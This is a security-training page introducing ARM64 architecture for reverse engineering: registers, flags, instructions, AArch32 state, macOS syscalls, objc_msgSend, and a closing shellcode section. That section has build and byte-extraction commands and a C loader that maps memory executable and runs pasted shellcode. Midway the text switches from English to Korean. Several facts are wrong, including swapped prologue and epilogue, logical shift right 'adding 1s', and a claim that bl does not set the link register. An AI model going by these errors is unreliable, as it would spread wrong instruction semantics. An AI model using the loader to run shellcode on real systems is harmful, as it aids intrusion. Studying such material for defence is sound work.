# Introduction to ARM64v8

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

In ARMv8 architecture, execution levels, known as Exception Levels (ELs), define the privilege level and capabilities of the execution environment. There are four exception levels, ranging from EL0 to EL3, each serving a different purpose:

1. **EL0 - User Mode**:
- This is the least-privileged level and is used for executing regular application code.
- Applications running at EL0 are isolated from each other and from the system software, enhancing security and stability.
2. **EL1 - Operating System Kernel Mode**:
- Most operating system kernels run at this level.
- EL1 has more privileges than EL0 and can access system resources, but with some restrictions to ensure system integrity. You go from EL0 to EL1 with the SVC instruction.
3. **EL2 - Hypervisor Mode**:
- This level is used for virtualization. A hypervisor running at EL2 can manage multiple operating systems (each in its own EL1) running on the same physical hardware.
- EL2 provides features for isolation and control of the virtualized environments.
- So virtual machine applications like Parallels can use the `hypervisor.framework` to interact with EL2 and run virtual machines without needing kernel extensions.
- TO move from EL1 to EL2 the `HVC` instruction is used.
4. **EL3 - Secure Monitor Mode**:
- This is the most privileged level and is often used for secure booting and trusted execution environments.
- EL3 can manage and control accesses between secure and non-secure states (such as secure boot, trusted OS, etc.).
- It was use for KPP (Kernel Patch Protection) in macOS, but it's not used anymore.
- EL3 is not used anymore by Apple.
- The transition to EL3 is typically done using the `SMC` (Secure Monitor Call) instruction.

The use of these levels allows for a structured and secure way to manage different aspects of the system, from user applications to the most privileged system software. ARMv8's approach to privilege levels helps in effectively isolating different system components, thereby enhancing the security and robustness of the system.

## **Registers (ARM64v8)**

ARM64 has **31 general-purpose registers**, labeled `x0` through `x30`. Each can store a **64-bit** (8-byte) value. For operations that require only 32-bit values, the same registers can be accessed in a 32-bit mode using the names w0 through w30.

1. **`x0`** to **`x7`** - These are typically used as scratch registers and for passing parameters to subroutines.
- **`x0`** also carries the return data of a function
2. **`x8`** - In the Linux kernel, `x8` is used as the system call number for the `svc` instruction. **In macOS the x16 is the one used!**
3. **`x9`** to **`x15`** - More temporary registers, often used for local variables.
4. **`x16`** and **`x17`** - **Intra-procedural Call Registers**. Temporary registers for immediate values. They are also used for indirect function calls and PLT (Procedure Linkage Table) stubs.
- **`x16`** is used as the **system call number** for the **`svc`** instruction in **macOS**.
5. **`x18`** - **Platform register**. It can be used as a general-purpose register, but on some platforms, this register is reserved for platform-specific uses: Pointer to current thread environment block in Windows, or to point to the currently **executing task structure in linux kernel**.
6. **`x19`** to **`x28`** - These are callee-saved registers. A function must preserve these registers' values for its caller, so they are stored in the stack and recovered before going back to the caller.
7. **`x29`** - **Frame pointer** to keep track of the stack frame. When a new stack frame is created because a function is called, the **`x29`** register is **stored in the stack** and the **new** frame pointer address is (**`sp`** address) is **stored in this registry**.
- This register can also be used as a **general-purpose registry** although it's usually used as reference to **local variables**.
8. **`x30`** or **`lr`**- **Link register** . It holds the **return address** when a `BL` (Branch with Link) or `BLR` (Branch with Link to Register) instruction is executed by storing the **`pc`** value in this register.
- It could also be used like any other register.
- If the current function is going to call a new function and therefore overwrite `lr`, it will store it in the stack at the beginning, this is the epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Store `fp` and `lr`, generate space and get new `fp`) and recover it at the end, this is the prologue (`ldp x29, x30, [sp], #48; ret` -> Recover `fp` and `lr` and return).
9. **`sp`** - **Stack pointer**, used to keep track of the top of the stack.
- the **`sp`** value should always be kept to at least a **quadword** **alignment** or a alignment exception may occur.
10. **`pc`** - **Program counter**, which points to the next instruction. This register can only be updates through exception generations, exception returns, and branches. The only ordinary instructions that can read this register are branch with link instructions (BL, BLR) to store the **`pc`** address in **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Also called **`wzr`** in it **32**-bit register form. Can be used to get the zero value easily (common operation) or to perform comparisons using **`subs`** like **`subs XZR, Xn, #10`** storing the resulting data nowhere (in **`xzr`**).

The **`Wn`** registers are the **32bit** version of the **`Xn`** register.

> [!TIP]
> The registers from X0 - X18 are volatile, which means that their values can be changed by function calls and interrupts. However, the registers from X19 - X28 are non-volatile, meaning their values must be preserved across function calls ("callee saved").

### SIMD and Floating-Point Registers

Moreover, there are another **32 registers of 128bit length** that can be used in optimized single instruction multiple data (SIMD) operations and for performing floating-point arithmetic. These are called the Vn registers although they can also operate in **64**-bit, **32**-bit, **16**-bit and **8**-bit and then they are called **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** and **`Bn`**.

### System Registers

**There are hundreds of system registers**, also called special-purpose registers (SPRs), are used for **monitoring** and **controlling** **processors** behaviour.\
They can only be read or set using the dedicated special instruction **`mrs`** and **`msr`**.

The special registers **`TPIDR_EL0`** and **`TPIDDR_EL0`** are commonly found when reversing engineering. The `EL0` suffix indicates the **minimal exception** from which the register can be accessed (in this case EL0 is the regular exception (privilege) level regular programs runs with).\
They are often used to store the **base address of the thread-local storage** region of memory. Usually the first one is readable and writable for programs running in EL0, but the second can be read from EL0 and written from EL1 (like kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE** contains several process components serialized into the operating-system-visible **`SPSR_ELx`** special register, being X the **permission** **level of the triggered** exception (this allows to recover the process state when the exception ends).\
These are the accessible fields:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- The **`N`**, **`Z`**, **`C`** and **`V`** condition flags:
- **`N`** means the operation yielded a negative result
- **`Z`** means the operation yielded zero
- **`C`** means the operation carried
- **`V`** means the operation yielded a signed overflow:
- The sum of two positive numbers yields a negative result.
- The sum of two negative numbers yields a positive result.
- In subtraction, when a large negative number is subtracted from a smaller positive number (or vice versa), and the result cannot be represented within the range of the given bit size.
- Obviously the processor doesn't now the operation is signed or not, so it will check C and V in the operations and indicate of a carry occurred in case it was signed or unsigned.

> [!WARNING]
> Not all the instructions update these flags. Some like **`CMP`** or **`TST`** do, and others that have an s suffix like **`ADDS`** also do it.

- The current **register width (`nRW`) flag**: If the flag holds the value 0, the program will run in the AArch64 execution state once resumed.
- The current **Exception Level** (**`EL`**): A regular program running in EL0 will have the value 0
- The **single stepping** flag (**`SS`**): Used by debuggers to single step by setting the SS flag to 1 inside **`SPSR_ELx`** through an exception. The program will run a step and issue a single step exception.
- The **illegal exception** state flag (**`IL`**): It's used to mark when a privileged software performs an invalid exception level transfer, this flag is set to 1 and the processor triggers an illegal state exception.
- The **`DAIF`** flags: These flags allow a privileged program to selectively mask certain external exceptions.
- If **`A`** is 1 it means **asynchronous aborts** will be triggered. The **`I`** configures to respond to external hardware **Interrupts Requests** (IRQs). and the F is related to **Fast Interrupt Requests** (FIRs).
- The **stack pointer select** flags (**`SPS`**): Privileged programs running in EL1 and above can swap between using their own stack pointer register and the user-model one (e.g. between `SP_EL1` and `EL0`). This switching is performed by writing to the **`SPSel`** special register. This cannot be done from EL0.

## **Calling Convention (ARM64v8)**

The ARM64 calling convention specifies that the **first eight parameters** to a function are passed in registers **`x0` through `x7`**. **Additional** parameters are passed on the **stack**. The **return** value is passed back in register **`x0`**, or in **`x1`** as well **if its 128 bits long**. The **`x19`** to **`x30`** and **`sp`** registers must be **preserved** across function calls.

When reading a function in assembly, look for the **function prologue and epilogue**. The **prologue** usually involves **saving the frame pointer (`x29`)**, **setting** up a **new frame pointer**, and a**llocating stack space**. The **epilogue** usually involves **restoring the saved frame pointer** and **returning** from the function.

### Calling Convention in Swift

Swift have its own **calling convention** that can be found in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Common Instructions (ARM64v8)**

ARM64 instructions generally have the **format `opcode dst, src1, src2`**, where **`opcode`** is the **operation** to be performed (such as `add`, `sub`, `mov`, etc.), **`dst`** is the **destination** register where the result will be stored, and **`src1`** and **`src2`** are the **source** registers. Immediate values can also be used in place of source registers.

- **`mov`**: **Move** a value from one **register** to another.
- Example: `mov x0, x1` — This moves the value from `x1` to `x0`.
- **`ldr`**: **Load** a value from **memory** into a **register**.
- Example: `ldr x0, [x1]` — This loads a value from the memory location pointed to by `x1` into `x0`.
- **Offset mode**: An offset affecting the orin pointer is indicated, for example:
- `ldr x2, [x1, #8]`, this will load in x2 the value from x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, this will load in x2 an object from the array x0, from the position x1 (index) \* 4
- **Pre-indexed mode**: This will apply calculations to the origin, get the result and also store the new origin in the origin.
- `ldr x2, [x1, #8]!`, this will load `x1 + 8` in `x2` and store in x1 the result of `x1 + 8`
- `str lr, [sp, #-4]!`, Store the link register in sp and update the register sp
- **Post-index mode**: This is like the previous one but the memory address is accessed and then the offset is calculated and stored.
- `ldr x0, [x1], #8`, load `x1` in `x0` and update x1 with `x1 + 8`
- **PC-relative addressing**: In this case the address to load is calculated relative to the PC register
- `ldr x1, =_start`, This will load the address where the `_start` symbol starts in x1 related to the current PC.
- **`str`**: **Store** a value from a **register** into **memory**.
- Example: `str x0, [x1]` — This stores the value in `x0` into the memory location pointed to by `x1`.
- **`ldp`**: **Load Pair of Registers**. This instruction **loads two registers** from **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
- Example: `ldp x0, x1, [x2]` — This loads `x0` and `x1` from the memory locations at `x2` and `x2 + 8`, respectively.
- **`stp`**: **Store Pair of Registers**. This instruction **stores two registers** to **consecutive memory** locations. The memory address is typically formed by adding an offset to the value in another register.
- Example: `stp x0, x1, [sp]` — This stores `x0` and `x1` to the memory locations at `sp` and `sp + 8`, respectively.
- `stp x0, x1, [sp, #16]!` — This stores `x0` and `x1` to the memory locations at `sp+16` and `sp + 24`, respectively, and updates `sp` with `sp+16`.
- **`add`**: **Add** the values of two registers and store the result in a register.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operando 2 (register or immediate)
- \[shift #N | RRX] -> Perform a shift or call RRX
- Example: `add x0, x1, x2` — This adds the values in `x1` and `x2` together and stores the result in `x0`.
- `add x5, x5, #1, lsl #12` — This equals to 4096 (a 1 shifter 12 times) -> 1 0000 0000 0000 0000
- **`adds`** This perform an `add` and updates the flags
- **`sub`**: **Subtract** the values of two registers and store the result in a register.
- Check **`add`** **syntax**.
- Example: `sub x0, x1, x2` — This subtracts the value in `x2` from `x1` and stores the result in `x0`.
- **`subs`** This is like sub but updating the flag
- **`mul`**: **Multiply** the values of **two registers** and store the result in a register.
- Example: `mul x0, x1, x2` — This multiplies the values in `x1` and `x2` and stores the result in `x0`.
- **`div`**: **Divide** the value of one register by another and store the result in a register.
- Example: `div x0, x1, x2` — This divides the value in `x1` by `x2` and stores the result in `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Add 0s from the end moving the other bits forward (multiply by n-times 2)
- **Logical shift right**: Add 1s at the beginning moving the other bits backward (divide by n-times 2 in unsigned)
- **Arithmetic shift right**: Like **`lsr`**, but instead of adding 0s if the most significant bit is a 1, **1s are added (**divide by ntimes 2 in signed)
- **Rotate right**: Like **`lsr`** but whatever is removed from the right it's appended to the left
- **Rotate Right with Extend**: Like **`ror`**, but with the carry flag as the "most significant bit". So the carry flag is moved to the bit 31 and the removed bit to the carry flag.
- **`bfm`**: **Bit Filed Move**, these operations **copy bits `0...n`** from a value an place them in positions **`m..m+n`**. The **`#s`** specifies the **leftmost bit** position and **`#r`** the **rotate right amount**.
- Bitfiled move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Copy a bitfield from a register and copies it to another register.
- **`BFI X1, X2, #3, #4`** Insert 4 bits from X2 from the 3rd bit of X1
- **`BFXIL X1, X2, #3, #4`** Extract from the 3rd bit of X2 four bits and copy them to X1
- **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
- **`SBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2, sign extends them, and places the result in X1
- **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
- **`UBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2 and places the zero-extended result in X1.
- **Sign Extend To X:** Extends the sign (or adds just 0s in the unsigned version) of a value to be able to perform operations with it:
- **`SXTB X1, W2`** Extends the sign of a byte **from W2 to X1** (`W2` is half of `X2`) to fill the 64bits
- **`SXTH X1, W2`** Extends the sign of a 16bit number **from W2 to X1** to fill the 64bits
- **`SXTW X1, W2`** Extends the sign of a byte **from W2 to X1** to fill the 64bits
- **`UXTB X1, W2`** Adds 0s (unsigned) to a byte **from W2 to X1** to fill the 64bits
- **`extr`:** Extracts bits from a specified **pair of registers concatenated**.
- Example: `EXTR W3, W2, W1, #3` This will **concat W1+W2** and get **from bit 3 of W2 up to bit 3 of W1** and store it in W3.
- **`cmp`**: **Compare** two registers and set condition flags. It's an **alias of `subs`** setting the destination register to the zero register. Useful to know if `m == n`.
- It supports the **same syntax as `subs`**
- Example: `cmp x0, x1` — This compares the values in `x0` and `x1` and sets the condition flags accordingly.
- **`cmn`**: **Compare negative** operand. In this case it's an **alias of `adds`** and supports the same syntax. Useful to know if `m == -n`.
- **`ccmp`**: Conditional comparison, it's a comparison that will be performed only if a previous comparison was true and will specifically set nzcv bits.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> if x1 != x2 and x3 < x4, jump to func
- This is because **`ccmp`** will only be executed if the **previous `cmp` was a `NE`**, if it wasn't the bits `nzcv` will be set to 0 (which won't satisfy the `blt` comparison).
- This ca also be used as `ccmn` (same but negative, like `cmp` vs `cmn`).
- **`tst`**: It checks if any of the values of the comparison are both 1 (it works like and ANDS without storing the result anywhere). It's useful to check a registry with a value and check if any of the bits of the registry indicated in the value is 1.
- Example: `tst X1, #7` Check if any of the last 3 bits of X1 is 1
- **`teq`**: XOR operation discarding the result
- **`b`**: Unconditional Branch
- Example: `b myFunction`
- Note that this won't fill the link register with the return address (not suitable for subrutine calls that needs to return back)
- **`bl`**: **Branch** with link, used to **call** a **subroutine**. Stores the **return address in `x30`**.
- Example: `bl myFunction` — This calls the function `myFunction` and stores the return address in `x30`.
- Note that this won't fill the link register with the return address (not suitable for subrutine calls that needs to return back)
- **`blr`**: **Branch** with Link to Register, used to **call** a **subroutine** where the target is **specified** in a **register**. Stores the return address in `x30`. (This is
- Example: `blr x1` — This calls the function whose address is contained in `x1` and stores the return address in `x30`.
- **`ret`**: **Return** from **subroutine**, typically using the address in **`x30`**.
- Example: `ret` — This returns from the current subroutine using the return address in `x30`.
- **`b.<cond>`**: Conditional branches
- **`b.eq`**: **Branch if equal**, based on the previous `cmp` instruction.
- Example: `b.eq label` — If the previous `cmp` instruction found two equal values, this jumps to `label`.
- **`b.ne`**: **Branch if Not Equal**. This instruction checks the condition flags (which were set by a previous comparison instruction), and if the compared values were not equal, it branches to a label or address.
- Example: After a `cmp x0, x1` instruction, `b.ne label` — If the values in `x0` and `x1` were not equal, this jumps to `label`.
- **`cbz`**: **Compare and Branch on Zero**. This instruction compares a register with zero, and if they are equal, it branches to a label or address.
- Example: `cbz x0, label` — If the value in `x0` is zero, this jumps to `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. This instruction compares a register with zero, and if they are not equal, it branches to a label or address.
- Example: `cbnz x0, label` — If the value in `x0` is non-zero, this jumps to `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Example: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Example: `tbz x0, #8, label`
- **Conditional select operations**: These are operations whose behaviour varies depending on the conditional bits.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> If true, X0 = X1, if false, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> If true, Xd = Xn + 1, if false, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> If true, Xd = NOT(Xn), if false, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> If true, Xd = Xn, if false, Xd = - Xm
- `cneg Xd, Xn, cond` -> If true, Xd = - Xn, if false, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> If true, Xd = 1, if false, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> If true, Xd = \<all 1>, if false, Xd = 0
- **`adrp`**: Compute the **page address of a symbol** and store it in a register.
- Example: `adrp x0, symbol` — This computes the page address of `symbol` and stores it in `x0`.
- **`ldrsw`**: **Load** a signed **32-bit** value from memory and **sign-extend it to 64** bits. This is used for common SWITCH cases.
- Example: `ldrsw x0, [x1]` — This loads a signed 32-bit value from the memory location pointed to by `x1`, sign-extends it to 64 bits, and stores it in `x0`.
- **`stur`**: **Store a register value to a memory location**, using an offset from another register.
- Example: `stur x0, [x1, #4]` — This stores the value in `x0` into the memory ddress that is 4 bytes greater than the address currently in `x1`.
- **`svc`** : Make a **system call**. It stands for "Supervisor Call". When the processor executes this instruction, it **switches from user mode to kernel mode** and jumps to a specific location in memory where the **kernel's system call handling** code is located.

- Example:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Save the link register and frame pointer to the stack**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **새 프레임 포인터 설정**: `mov x29, sp` (현재 함수의 새 프레임 포인터를 설정합니다)
3. **로컬 변수용 스택 공간 할당** (필요한 경우): `sub sp, sp, <size>` (`<size>`는 필요한 바이트 수입니다)

### **함수 에필로그**

1. **로컬 변수 할당 해제** (할당된 경우): `add sp, sp, <size>`
2. **링크 레지스터 및 프레임 포인터 복원**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Return**: `ret` (링크 레지스터에 있는 주소를 사용하여 호출자에게 제어를 반환함)

## ARM 일반 메모리 보호

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 실행 상태

Armv8-A는 32비트 프로그램 실행을 지원합니다. **AArch32**는 **두 가지 명령어 세트** 중 하나인 **`A32`** 또는 **`T32`**로 실행될 수 있으며 **`interworking`**을 통해 전환할 수 있습니다.\
권한이 있는 64비트 프로그램은 예외 레벨 전송을 실행하여 더 낮은 권한의 32비트 프로그램의 실행을 예약할 수 있습니다.\
64비트에서 32비트로의 전환은 더 낮은 예외 레벨에서 발생한다는 점에 유의하세요(예: EL1의 64비트 프로그램이 EL0의 프로그램을 트리거하는 경우). 이는 `AArch32` 프로세스 스레드가 실행 준비가 되었을 때 특수 레지스터인 **`SPSR_ELx`**의 **비트 4를** **1로 설정**하고 `SPSR_ELx`의 나머지 부분에 **AArch32** 프로그램의 CPSR을 저장함으로써 이루어집니다. 그런 다음 권한 있는 프로세스가 **`ERET`** 명령을 호출하여 프로세서가 **`AArch32`**로 전환되며 CPSR에 따라 A32 또는 T32로 진입합니다.**

`interworking`은 CPSR의 J 및 T 비트를 사용하여 발생합니다. `J=0` 및 `T=0`은 **`A32`**를 의미하고 `J=0` 및 `T=1`은 **T32**를 의미합니다. 이는 기본적으로 명령어 세트가 T32임을 표시하기 위해 **최하위 비트를 1로 설정**하는 것을 의미합니다.\
이 비트는 **interworking 분기 명령들**에서 설정되지만, PC가 목적지 레지스터로 설정될 때 다른 명령들로 직접 설정될 수도 있습니다. 예:

또 다른 예:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### 레지스터

16개의 32-bit 레지스터(r0-r15)가 있다. **r0에서 r14까지**는 **임의의 연산**에 사용할 수 있지만, 일부는 일반적으로 예약되어 있다:

- **`r15`**: 프로그램 카운터(항상). 다음 명령어의 주소를 담는다. A32에서는 current + 8, T32에서는 current + 4.
- **`r11`**: 프레임 포인터
- **`r12`**: 절차 내부 호출 레지스터
- **`r13`**: 스택 포인터 (스택은 항상 16바이트 정렬되어 있음)
- **`r14`**: 링크 레지스터

또한 레지스터는 **`banked registries`**에 백업된다. 이는 레지스터 값을 저장하여 예외 처리와 특권 연산에서 매번 수동으로 저장/복원할 필요 없이 **빠른 컨텍스트 스위칭**을 가능하게 하는 장소이다.\
이것은 예외가 전달된 프로세서 모드의 **`CPSR`**에서 **`SPSR`**로 프로세서 상태를 저장함으로써 이루어진다. 예외 복귀 시에는 **`CPSR`**이 **`SPSR`**에서 복원된다.

### CPSR - Current Program Status Register

AArch32에서 CPSR은 AArch64의 **`PSTATE`**와 유사하게 동작하며, 예외가 발생하면 실행을 나중에 복원하기 위해 **`SPSR_ELx`**에 저장된다:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

필드는 몇 개의 그룹으로 나뉜다:

- Application Program Status Register (APSR): 산술 플래그이며 EL0에서 접근 가능
- Execution State Registers: 프로세스 동작(운영체제가 관리)

#### Application Program Status Register (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** 플래그(AArch64와 동일)
- **`Q`** 플래그: 전문 포화 산술 명령 실행 중에 **정수 포화(integer saturation)**가 발생하면 1로 설정된다. 한 번 **`1`**로 설정되면 수동으로 0으로 설정할 때까지 유지된다. 또한 이 값을 암묵적으로 검사하는 명령은 없으며 수동으로 읽어야 한다.
- **`GE`** (Greater than or equal) 플래그: SIMD (Single Instruction, Multiple Data) 연산에서 사용된다(예: "parallel add", "parallel subtract"). 이러한 연산은 단일 명령으로 여러 데이터 포인트를 처리할 수 있다.

예를 들어, **`UADD8`** 명령은 병렬로 네 쌍의 바이트(두 개의 32비트 오퍼랜드에서)를 더하여 결과를 32비트 레지스터에 저장한다. 그런 다음 이 결과에 따라 **`APSR`**의 **`GE`** 플래그를 설정한다. 각 GE 플래그는 바이트 더하기 중 하나에 대응하며, 해당 바이트 쌍의 덧셈이 오버플로우했는지를 나타낸다.

**`SEL`** 명령은 이러한 **`GE`** 플래그를 사용하여 조건부 동작을 수행한다.

#### Execution State Registers

- **`J`** 및 **`T`** 비트: **`J`**는 0이어야 하며 **`T`**가 0이면 A32 명령 세트가 사용되고, 1이면 T32가 사용된다.
- **IT Block State Register** (`ITSTATE`): 이는 10-15 비트와 25-26 비트이다. **`IT`** 접두사 그룹 내부의 명령들에 대한 조건을 저장한다.
- **`E`** 비트: 엔디안성(endianness)을 나타낸다.
- **Mode and Exception Mask Bits** (0-4): 현재 실행 상태를 결정한다. 5번째 비트는 프로그램이 32bit(1)로 실행되는지 또는 64bit(0)로 실행되는지를 나타낸다. 나머지 4비트는 예외가 발생하여 처리되는 동안 사용되는 **예외 모드**를 나타내며, 설정된 값은 처리 중 다른 예외가 발생했을 때의 우선순위를 표시한다.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

- **`AIF`**: 특정 예외는 **`A`**, `I`, `F` 비트를 사용하여 비활성화할 수 있다. **`A`**가 1이면 **asynchronous aborts**가 발생함을 의미한다. **`I`**는 외부 하드웨어 **Interrupts Requests**(IRQs)에 응답하도록 설정하고, `F`는 **Fast Interrupt Requests**(FIRs)에 관련된다.

## macOS

### BSD syscalls

Check out [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master) or run `cat /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/include/sys/syscall.h`. BSD syscalls will have **x16 > 0**.

### Mach Traps

Check out in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) the `mach_trap_table` and in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) the prototypes. The mex number of Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps will have **x16 < 0**, so you need to call the numbers from the previous list with a **minus**: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.

You can also check **`libsystem_kernel.dylib`** in a disassembler to find how to call these (and BSD) syscalls:
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
Note that **Ida** and **Ghidra** can also decompile **specific dylibs** from the cache just by passing the cache.

> [!TIP]
> 때로는 여러 syscalls (BSD 및 Mach)의 코드가 스크립트로 생성되기 때문에(소스 코드의 주석을 확인) **`libsystem_kernel.dylib`**에서 **디컴파일된** 코드를 확인하는 것이 **소스 코드**를 확인하는 것보다 더 쉬울 때가 있습니다. dylib에서는 실제로 무엇이 호출되는지를 찾을 수 있습니다.

### machdep calls

XNU는 machine dependent(머신 종속)이라고 불리는 또 다른 유형의 호출을 지원합니다. 이러한 호출들의 번호는 아키텍처에 따라 달라지며, 호출명이나 번호가 고정되어 있지 않습니다.

### comm page

이것은 커널 소유의 메모리 페이지로, 모든 사용자 프로세스의 주소 공간에 매핑됩니다. 자주 사용되어 syscalls를 통해 전환하는 것이 매우 비효율적일 정도인 커널 서비스의 경우, 사용자 모드에서 커널 공간으로의 전환을 syscalls를 사용하는 것보다 더 빠르게 하기 위해 설계되었습니다.

예를 들어 `gettimeofdate` 호출은 comm page에서 `timeval` 값을 직접 읽습니다.

### objc_msgSend

Objective-C 또는 Swift 프로그램에서 이 함수가 사용되는 것을 매우 흔히 볼 수 있습니다. 이 함수는 Objective-C 객체의 메서드를 호출할 수 있게 해줍니다.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> 인스턴스를 가리키는 포인터
- x1: op -> 메서드의 Selector
- x2... -> 호출된 메서드의 나머지 인수들

따라서, 이 함수로 분기하기 전에 breakpoint를 걸어두면 lldb에서 무엇이 호출되는지 쉽게 찾을 수 있습니다(이 예제에서는 객체가 명령을 실행할 `NSConcreteTask`의 객체를 호출합니다):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> 환경 변수 **`NSObjCMessageLoggingEnabled=1`** 를 설정하면 이 함수가 호출될 때 `/tmp/msgSends-pid` 같은 파일에 기록할 수 있습니다.
>
> 또한, **`OBJC_HELP=1`** 를 설정하고 어떤 바이너리를 실행하면 특정 Objc-C 동작이 발생할 때 **로그**를 남기기 위해 사용할 수 있는 다른 환경 변수들을 확인할 수 있습니다.

이 함수가 호출되면, 지정된 인스턴스에서 호출된 메서드를 찾아야 하며, 이를 위해 다음과 같은 여러 검색이 수행됩니다:

- Perform optimistic cache lookup:
- If successful, done
- Acquire runtimeLock (read)
- If (realize && !cls->realized) 클래스 실체화(realize)
- If (initialize && !cls->initialized) 클래스 초기화(initialize)
- Try class own cache:
- If successful, done
- Try class method list:
- If found, fill cache and done
- Try superclass cache:
- If successful, done
- Try superclass method list:
- If found, fill cache and done
- If (resolver) try method resolver, and repeat from class lookup
- If still here (= all else has failed) try forwarder

### Shellcodes

컴파일하려면:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
바이트를 추출하려면:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
새로운 macOS의 경우:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>shellcode를 테스트하는 C 코드</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

